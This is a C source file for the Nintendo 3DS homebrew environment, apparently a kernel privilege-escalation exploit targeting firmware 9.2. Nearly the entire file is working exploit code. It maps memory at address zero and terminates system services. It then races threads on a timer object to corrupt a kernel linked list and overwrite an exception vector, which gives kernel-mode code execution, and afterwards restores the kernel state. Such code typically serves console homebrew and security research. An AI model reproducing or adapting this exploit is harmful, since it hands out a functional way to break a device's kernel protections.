#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>

#include "text.h"
#include "rohax2.h"
#include "asm.h"
#include "ns.h"

Handle wait_handles[256] = {0};
const int num_waits = sizeof(wait_handles) / sizeof(wait_handles[0]);

u32* test_buf = (u32*)0x0dea0000;
u32* test_buf_mirror = NULL;

vu32 done = 0;
vu32 stop_loop = 0;

u8* bottom_fb = NULL;

u32 corruption_target = 0xdff80000 + 0x638;
// u32 corruption_initial_val = 0xFFF020B4; // N9.2
u32 corruption_initial_val = 0xFFF018B4; // N9.2 - 3dshax
u32 ll_node_kobj_pool_ptr = 0xFFF31460; // N9.2

vu32 val_objptr = 0;
vu32 val_next = 0;
vu32 val_prev = 0;

Handle wait_thread_handles[16] = {0};
#define num_wait_threads (sizeof(wait_thread_handles) / sizeof(wait_thread_handles[0]))
void* wait_thread_stacks[num_wait_threads];

void wait_thread()
{
	s32 out = 0;

	svcWaitSynchronizationN(&out, wait_handles, num_waits, false, 0x0FFFFFFFFFFFFFFFll);

	svcExitThread();
}

void ktest()
{
	// wait for other thread to be ready
	while(*(vu32*)&test_buf_mirror[0] == 0xdadadada) svcSleepThread(1 * 1000 * 1000);

	// printf("%08X\n", (unsigned int)_cpsr());

	// go exploit stuff
	{
		// printf("test %08X\n", *(unsigned int*)0x00000000);
		// printf("sup?\n");

		svcSleepThread(1 * 1000 * 1000);

		Handle wait_obj = 0;

		// svcCreatewait_obj(&wait_obj, true);
		svcCreateTimer(&wait_obj, 2);

		int i;
		for(i = 0; i < num_waits; i++) wait_handles[i] = wait_obj;

		for(i = 0; i < num_wait_threads; i++)
		{
			// const u32 stack_len = 0x1000;
			// u8* stack = malloc(stack_len);

			// Result ret = svcCreateThread(&wait_thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x20, 0);
			// Result ret = svcCreateThread(&wait_thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x19, 1);
			svcCreateThread(&wait_thread_handles[i], wait_thread, 0, wait_thread_stacks[i], 0x19, 1);

			// printf("thread %02d %08X %08X %08X\n", i, (unsigned int)wait_thread_handles[i], (unsigned int)ret, (unsigned int)test_buf_mirror[2]);

			svcSleepThread(1 * 1000 * 1000);

			if(stop_loop) break;
		}
	}

	// printf("ktest done\n");

	svcExitThread();
}

void hello()
{
	asm(
		"clrex\n\t"
		"cpsid i"
	);

	stop_loop = 1;

	// fix up exception vector
	*(u32*)corruption_target = corruption_initial_val;
	flush_dcache();

	memset(bottom_fb, 0x00, 240 * 320 * 3);

	drawString(bottom_fb, "hello from arm11 kernel", 10, 10);
	flush_dcache();

	// restore ll_node_kobj_pool
	const u32 buffer_size = 0x10000;
	u8* buffer = linearMemAlign(buffer_size, 0x10);
	u32 buffer_kva = (u32)buffer;
	if(buffer_kva >= 0x30000000) buffer_kva += 0xE0000000 - 0x30000000;
	else buffer_kva += 0xE0000000 - 0x14000000;

	int i;
	for(i = 0; i < buffer_size; i += 0xC) *(u32*)&buffer[i] = buffer_kva + i + 0xC;

	*(vu32*)ll_node_kobj_pool_ptr = buffer_kva;

	done = 1;

	drawString(bottom_fb, "hello from arm11 kernel again", 10, 20);
	drawHex(bottom_fb, val_next, 10, 30);
	flush_dcache();

	// restore corrupted linked list
	u32* cur = (u32*)val_next;
	while(*cur != 0) cur = (u32*) *cur;
	*cur = val_next;

	drawString(bottom_fb, "hello from arm11 kernel again again", 10, 40);
	drawHex(bottom_fb, (u32)cur, 10, 50);
	flush_dcache();

	u32 rfe_data[] = {(u32)&return_to_usermode, 0x10, 0xbeefdad, 0xbabeddad, 0xdeaddad, 0xbeefbabe, 0xcafedead};

	_rfe(rfe_data);

	while(1);
}

void speedracer()
{
	*(vu32*)&test_buf_mirror[0x0] = 0x00000040;

	// write a jmp instruction!
	*(vu32*)&test_buf_mirror[0x3] = 0xE51FF004; // ldr pc, [pc, #-4]
	*(vu32*)&test_buf_mirror[0x4] = (u32)&hello; // pc

	while(1)
	{
		val_objptr = *(vu32*)&test_buf_mirror[0x2];

		if(val_objptr != 0xdadadada)
		{
			break;
		}
	}
	
	while(1)
	{
		val_next = *(vu32*)&test_buf_mirror[0x0];

		if(val_next && val_next != 0xdadadada)
		{
			break;
		}
	}

	// while(1)
	// {
		val_prev = *(vu32*)&test_buf_mirror[0x1];

	// 	if(val_prev && val_prev != 0xdadadada)
	// 	{
	// 		break;
	// 	}
	// }

	// *(vu32*)0xdead0000 = val_next;

	while(!done)
	{
		*(vu32*)&test_buf_mirror[0x0] = 0x00000040;
		*(vu32*)&test_buf_mirror[0x1] = corruption_target; // exception vector
		*(vu32*)&test_buf_mirror[0x2] = 0xb0b0b0b0;
		*(vu32*)&test_buf_mirror[0x10] = corruption_target; // exception vector
		// *(vu32*)&test_buf_mirror[0x11] = 0xd0d0d0d0;
		*(vu32*)&test_buf_mirror[0x12] = val_objptr; // kthread
	}

	*(vu32*)&test_buf_mirror[0x0] = val_next;
	*(vu32*)&test_buf_mirror[0x1] = val_prev;
	*(vu32*)&test_buf_mirror[0x2] = val_objptr;

	// svcExitThread();
}

Result zhax()
{
	// make it possible to schedule threads on syscore
	Result ret = APT_SetAppCpuTimeLimit(5);
	printf("APT_SetAppCpuTimeLimit %08X\n", (unsigned int)ret);

	// set max priority on current thread
	svcSetThreadPriority(0xFFFF8000, 0x19);

	const u32 stack_len = 0x10000;
	u8* stack = malloc(stack_len);
	
	test_buf = memalign(0x1000, 0x1000);
	memset(test_buf, 0xda, 0x1000);

	// map to 0
	ret = HB_ControlProcessMemory(NULL, (u32)test_buf_mirror, (u32)test_buf, 0x1000, MEMOP_MAP, MEMPERM_READ | MEMPERM_WRITE | MEMPERM_EXECUTE);
	printf("ret %08X %08X\n", (unsigned int)ret, (unsigned int)test_buf);

	if(!ret)
	{
		// allocate stacks
			int i;
			for(i = 0; i < num_wait_threads; i++)
			{
				wait_thread_stacks[i] = (u8*)malloc(stack_len) + stack_len;
			}
		// kill all the processes (in reverse creation order)
			NS_TerminateTitle(0x4013000002802ll, 1 * 1000 * 1000); // dlp     ; 0x25
			NS_TerminateTitle(0x4013000002c02ll, 1 * 1000 * 1000); // nim     ; 0x24
			NS_TerminateTitle(0x4013000002b02ll, 1 * 1000 * 1000); // ndm     ; 0x23
			NS_TerminateTitle(0x4013000003502ll, 1 * 1000 * 1000); // news    ; 0x22
			NS_TerminateTitle(0x4013000003802ll, 1 * 1000 * 1000); // act     ; 0x21
			NS_TerminateTitle(0x4013000003402ll, 1 * 1000 * 1000); // boss    ; 0x20
			NS_TerminateTitle(0x4013000002402ll, 1 * 1000 * 1000); // ac      ; 0x1f
			NS_TerminateTitle(0x4013000003202ll, 1 * 1000 * 1000); // friends ; 0x1e
			NS_TerminateTitle(0x4013000002602ll, 1 * 1000 * 1000); // cecd    ; 0x1d
			NS_TerminateTitle(0x4013000002f02ll, 1 * 1000 * 1000); // ssl     ; 0x1c
			NS_TerminateTitle(0x4013000002902ll, 1 * 1000 * 1000); // http    ; 0x1b
			NS_TerminateTitle(0x4013000002e02ll, 1 * 1000 * 1000); // socket  ; 0x1a
			NS_TerminateTitle(0x4013000002d02ll, 1 * 1000 * 1000); // nwm     ; 0x19
			NS_TerminateTitle(0x4013000003302ll, 1 * 1000 * 1000); // ir      ; 0x18
			NS_TerminateTitle(0x4013000002002ll, 1 * 1000 * 1000); // mic     ; 0x17
			NS_TerminateTitle(0x4013000001602ll, 1 * 1000 * 1000); // camera  ; 0x16
			NS_TerminateTitle(0x4013000002702ll, 1 * 1000 * 1000); // csnd    ; 0x15
			NS_TerminateTitle(0x4013000001c02ll, 1 * 1000 * 1000); // gsp     ; 0x14
			NS_TerminateTitle(0x4013000001502ll, 1 * 1000 * 1000); // am      ; 0x13
			NS_TerminateTitle(0x4013000001a02ll, 1 * 1000 * 1000); // dsp     ; 0x12
			NS_TerminateTitle(0x4013000001802ll, 1 * 1000 * 1000); // codec   ; 0x11
			NS_TerminateTitle(0x4013000001d02ll, 1 * 1000 * 1000); // hid     ; 0x10
			NS_TerminateTitle(0x4003000008a02ll, 1 * 1000 * 1000); // ErrDisp ; 0x0e
			NS_TerminateTitle(0x4013000003102ll, 1 * 1000 * 1000); // ps      ; 0x0d
			NS_TerminateTitle(0x4013000002302ll, 1 * 1000 * 1000); // spi     ; 0x0c
			NS_TerminateTitle(0x4013000002102ll, 1 * 1000 * 1000); // pdn     ; 0x0b
			NS_TerminateTitle(0x4013000001f02ll, 1 * 1000 * 1000); // mcu     ; 0x0a
			NS_TerminateTitle(0x4013000001e02ll, 1 * 1000 * 1000); // i2c     ; 0x09
			NS_TerminateTitle(0x4013000001b02ll, 1 * 1000 * 1000); // gpio    ; 0x08
			NS_TerminateTitle(0x4013000001702ll, 1 * 1000 * 1000); // cfg     ; 0x07
			NS_TerminateTitle(0x4013000002202ll, 1 * 1000 * 1000); // ptm     ; 0x06
			// need to do menu second to last because killing it kills our ns:s handle
			// NS_TerminateTitle(0x4003000008202ll, 1 * 1000 * 1000); // menu (JPN)
			// NS_TerminateTitle(0x4003000008F02ll, 1 * 1000 * 1000); // menu (USA)
			// NS_TerminateTitle(0x4003000009802ll, 1 * 1000 * 1000); // menu (EUR)

			// NS_TerminateTitle(0x4013000008002ll, 1 * 1000 * 1000); // ns      ; 0x05

		Handle thread = 0;
		
		// ret = svcCreateThread(&thread, speedracer, 0, (u32*)(stack + stack_len), 0x20, 1);
		ret = svcCreateThread(&thread, ktest, 0, (u32*)(stack + stack_len), 0x20, 1);

		printf("hi\n");

		// ktest();
		speedracer();

		while(1) printf("done\n");
	}

	return 0;
}
